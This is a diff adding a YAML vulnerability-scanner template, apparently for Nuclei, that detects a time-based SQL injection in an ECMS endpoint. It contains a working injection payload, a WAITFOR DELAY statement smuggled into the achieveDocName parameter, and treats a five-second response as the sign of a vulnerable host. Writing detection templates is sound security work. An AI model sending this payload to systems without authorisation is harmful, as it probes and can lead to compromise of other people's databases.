@@ -1,0 +1,26 @@
+id: ECMS-getProjectBaseDocData-sqlInjection
+info:
+  name: ECMS-getProjectBaseDocData-sqlInjection
+  author: iSee857
+  severity: high
+  description: ECMS-getProjectBaseDocData-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1%27);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "total\":"
